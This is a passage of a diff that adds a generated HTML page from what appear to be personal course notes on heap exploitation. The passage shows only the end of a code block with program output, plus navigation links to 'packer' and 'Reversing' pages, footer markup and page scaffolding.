+ [%] (null) uses (null) on PKM!
+$</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results />
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../08-packer/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">08 packer</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../03-reversing/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Reversing</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>Check out my GitHub profile for other notes: <a href="https://github.com/francesco-plt">https://github.com/francesco-plt</a></p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script>window.__DOCS__ = { "title": "Heap", level: 1, icon: "file", hasPrism: true, hasMermaid: false, hasMath: true }</script>
+</body>
+</html>
